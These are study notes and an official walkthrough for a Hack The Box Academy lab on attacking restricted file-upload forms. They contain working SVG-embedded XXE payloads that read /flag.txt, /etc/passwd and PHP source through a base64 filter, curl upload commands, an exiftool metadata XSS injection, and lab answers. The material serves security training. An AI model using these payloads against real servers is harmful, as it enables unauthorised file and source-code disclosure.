# NOTE — Limited File Uploads

## ID
531

## Module
File Upload Attacks

## Kind
notes

## Title
Section 8 — Limited File Uploads

## Description
Exploiting secure (non-arbitrary) file upload forms via SVG/XML-based XXE injection to read local files and PHP source code, plus XSS and DoS attack vectors through allowed file types.

## Tags
xxe, svg, file-upload, xss, dos, php-filter

## Commands
- `cat > xxe.svg << 'EOF' ... EOF` — create malicious SVG with XXE payload
- `curl -s -X POST http://<TARGET>:<PORT>/upload.php -F "uploadFile=@xxe.svg;type=image/svg+xml"` — upload SVG with correct MIME type
- `exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' <IMAGE>` — inject XSS into image metadata
- `echo "<BASE64_STRING>" | base64 -d` — decode base64-encoded PHP source from XXE exfiltration

## What This Section Covers
Even when a file upload form is "secure" against arbitrary uploads (e.g., only allows SVG), attackers can still exploit the allowed file types. SVG files are XML-based, meaning they can carry XXE payloads to read server files or PHP source code. Other limited upload attacks include XSS via SVG/HTML/metadata injection and DoS via decompression bombs or pixel floods.

## Methodology
1. Identify which file types the upload form accepts (fuzz extensions if needed).
2. If SVG is allowed, craft an SVG with an XXE entity pointing to the target file: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.
3. Upload the SVG with `Content-Type: image/svg+xml` to pass both client-side and server-side MIME checks.
4. View the uploaded SVG's page source — the entity resolves and the file content appears inside the `<svg>` tag.
5. To read PHP source without breaking XML parsing, use the base64 PHP filter wrapper: `php://filter/convert.base64-encode/resource=upload.php`.
6. Decode the base64 output to get the raw PHP source code, then look for upload directories, naming schemes, and further attack surface.

## Multi-step Workflow
```
# Q1 — Read /flag.txt via SVG XXE
cat > xxe.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg>&xxe;</svg>
EOF

curl -s -X POST http://<TARGET>:<PORT>/upload.php \
  -F "uploadFile=@xxe.svg;type=image/svg+xml"

# Browse to the displayed SVG → View Page Source → flag is inside <svg> tag

# Q2 — Read upload.php source to find uploads directory
cat > xxe_src.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
EOF

curl -s -X POST http://<TARGET>:<PORT>/upload.php \
  -F "uploadFile=@xxe_src.svg;type=image/svg+xml"

# View Page Source → copy base64 blob → decode:
echo "<BASE64_BLOB>" | base64 -d
# Look for $target_dir variable → ./images/
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Read /flag.txt | (paste flag here) | SVG XXE with `file:///flag.txt` entity, viewed in page source |
| Q2 — Uploads directory name | ./images/ | SVG XXE with `php://filter/convert.base64-encode/resource=upload.php`, base64-decoded `$target_dir` variable |

## Key Takeaways
- SVG files are XML — if a server parses uploaded SVGs, XXE is on the table even when arbitrary uploads are blocked.
- Always set `Content-Type: image/svg+xml` when uploading SVGs; the server validates both the header and the detected MIME type.
- Use `php://filter/convert.base64-encode` to exfiltrate PHP source safely — raw PHP would break the XML parser.
- Reading source code (whitebox) from XXE lets you find upload directories, naming schemes, and further vulns.
- XSS is possible through SVG `<script>` tags, HTML uploads, and image metadata (exiftool Comment/Artist fields).
- DoS vectors include decompression bombs (nested ZIPs), pixel floods (fake image dimensions), and oversized files.

## Gotchas
- If Q2 still returns the flag instead of base64, respawn the target — the server caches the previous SVG via `latest.xml`.
- The server writes the uploaded filename to `latest.xml` in the uploads dir, which is what gets rendered — so each new upload overwrites the displayed file.
- Changing an image's MIME-Type to `text/html` can make the browser render it as HTML, triggering embedded XSS even without metadata display.

# HTB Solution
## Question 1

### "The above exercise contains an upload functionality that should be secure against arbitrary file uploads. Try to exploit it using one of the attacks shown in this section to read "/flag.txt""

After spawning the target machine, students need to use one of the `SVG upload attacks`, such that if the web application of the spawned target machine uses an outdated library or function, it can be exploited with `XXE` to read the flag. Students need to write to a file with the `.svg` extension the following XXE/XML payload:

        XML
`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "/flag.txt"> ]> <svg>&xxe;</svg>`

![File_Upload_Attacks_Walkthrough_Image_31.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_31.png)

After successfully uploading the file, students need to view the page source to find the flag within the `<svg>`" element on line 19:

![File_Upload_Attacks_Walkthrough_Image_32.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_32.png)

Answer: {hidden}

# Limited File Uploads

## Question 2

### "Try to read the source code of 'upload,php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes)"

After spawning the target machine and trying to upload a file to it, students will notice that it does not disclose its uploads directory, thus, students need to read the source code of `upload.php`, which should contain the uploads directory. Students need to write to a file with the `.svg` extension the following `XXE/XML` payload that utilizes the PHP filter `convert.base64-encode`:

        XML
`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg>`

![File_Upload_Attacks_Walkthrough_Image_33.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_33.png)

After successfully uploading the file, students need to view the page source to source code within the `<svg>` element on line 19 (in case students are not getting the source code, but instead the flag from the previous question, they need to respawn the target machine and upload the payload again):

![File_Upload_Attacks_Walkthrough_Image_34.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_34.png)

Subsequently, students need to base64-decode the encoded source code:

        shell
`echo "PD9waHAKJHRhcmdldF9kaXIgPSAiLi9pbWFnZXMvIjsKJGZpbGVOYW1lID0gYmFzZW5hbWUoJF9GSUxFU1sidXBsb2FkRmlsZSJdWyJuYW1lIl0pOwokdGFyZ2V0X2ZpbGUgPSAkdGFyZ2V0X2RpciAuICRmaWxlTmFtZTsKJGNvbnRlbnRUeXBlID0gJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0eXBlJ107CiRNSU1FdHlwZSA9IG1pbWVfY29udGVudF90eXBlKCRfRklMRVNbJ3VwbG9hZEZpbGUnXVsndG1wX25hbWUnXSk7CgppZiAoIXByZWdfbWF0Y2goJy9eLipcLnN2ZyQvJywgJGZpbGVOYW1lKSkgewogICAgZWNobyAiT25seSBTVkcgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9Cgpmb3JlYWNoIChhcnJheSgkY29udGVudFR5cGUsICRNSU1FdHlwZSkgYXMgJHR5cGUpIHsKICAgIGlmICghaW5fYXJyYXkoJHR5cGUsIGFycmF5KCdpbWFnZS9zdmcreG1sJykpKSB7CiAgICAgICAgZWNobyAiT25seSBTVkcgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgICAgICBkaWUoKTsKICAgIH0KfQoKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgICRsYXRlc3QgPSBmb3BlbigkdGFyZ2V0X2RpciAuICJsYXRlc3QueG1sIiwgInciKTsKICAgIGZ3cml0ZSgkbGF0ZXN0LCBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSkpOwogICAgZmNsb3NlKCRsYXRlc3QpOwogICAgZWNobyAiRmlsZSBzdWNjZXNzZnVsbHkgdXBsb2FkZWQiOwp9IGVsc2UgewogICAgZWNobyAiRmlsZSBmYWlsZWQgdG8gdXBsb2FkIjsKfQo=" | base64 -d`

        shell-session
`┌─[us-academy-1]─[10.10.14.49]─[htb-ac413848@pwnbox-base]─[~] └──╼ [★]$ echo "PD9waHAKJHRhcmdldF9kaXIgPSAiLi9pbWFnZXMvIjsKJGZpbGVOYW1lID0gYmFzZW5hbWUoJF9GSUxFU1sidXBsb2FkRmlsZSJdWyJuYW1lIl0pOwokdGFyZ2V0X2ZpbGUgPSAkdGFyZ2V0X2RpciAuICRmaWxlTmFtZTsKJGNvbnRlbnRUeXBlID0gJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0eXBlJ107CiRNSU1FdHlwZSA9IG1pbWVfY29udGVudF90eXBlKCRfRklMRVNbJ3VwbG9hZEZpbGUnXVsndG1wX25hbWUnXSk7CgppZiAoIXByZWdfbWF0Y2goJy9eLipcLnN2ZyQvJywgJGZpbGVOYW1lKSkgewogICAgZWNobyAiT25seSBTVkcgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9Cgpmb3JlYWNoIChhcnJheSgkY29udGVudFR5cGUsICRNSU1FdHlwZSkgYXMgJHR5cGUpIHsKICAgIGlmICghaW5fYXJyYXkoJHR5cGUsIGFycmF5KCdpbWFnZS9zdmcreG1sJykpKSB7CiAgICAgICAgZWNobyAiT25seSBTVkcgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgICAgICBkaWUoKTsKICAgIH0KfQoKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgICRsYXRlc3QgPSBmb3BlbigkdGFyZ2V0X2RpciAuICJsYXRlc3QueG1sIiwgInciKTsKICAgIGZ3cml0ZSgkbGF0ZXN0LCBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSkpOwogICAgZmNsb3NlKCRsYXRlc3QpOwogICAgZWNobyAiRmlsZSBzdWNjZXNzZnVsbHkgdXBsb2FkZWQiOwp9IGVsc2UgewogICAgZWNobyAiRmlsZSBmYWlsZWQgdG8gdXBsb2FkIjsKfQo=" | base64 -d <?php $target_dir = "./images/"; $fileName = basename($_FILES["uploadFile"]["name"]); $target_file = $target_dir . $fileName; $contentType = $_FILES['uploadFile']['type']; $MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']); if (!preg_match('/^.*\.svg$/', $fileName)) {     echo "Only SVG images are allowed";    die(); } foreach (array($contentType, $MIMEtype) as $type) {     if (!in_array($type, array('image/svg+xml'))) {        echo "Only SVG images are allowed";        die();    } } if ($_FILES["uploadFile"]["size"] > 500000) {     echo "File too large";    die(); } if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {     $latest = fopen($target_dir . "latest.xml", "w");    fwrite($latest, basename($_FILES["uploadFile"]["name"]));    fclose($latest);    echo "File successfully uploaded"; } else {     echo "File failed to upload"; }`

Students at last will know that the upload directory is the value of the `target_dir` variable, which is `./images/`.

Answer: {hidden}